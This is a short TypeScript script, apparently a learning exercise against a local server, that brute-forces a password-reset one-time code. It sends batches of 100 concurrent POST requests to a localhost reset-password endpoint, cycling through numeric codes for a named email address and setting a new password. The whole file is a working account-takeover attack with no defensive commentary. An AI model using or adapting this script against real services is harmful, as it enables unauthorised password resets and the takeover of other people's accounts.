import axios from 'axios';

async function attackScript(otp: string){

  let data = {
    "email": "shauryasofficial27@gmail.com",
    "otp": otp,
    "newPassword": "New Password"
  };
  
  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { },
    data : data
  };
  
  try{
    await axios.request(config);
  }catch(e){
    
  }
  
}

async function main(){
  for(let i = 100000; i < 999999999; i += 100){
    console.log(i);
      const p = [];
      for(let j = 0; j < 100; j++){
          p.push(attackScript((i+j).toString()));
      }
      await Promise.all(p);
  }
}

main();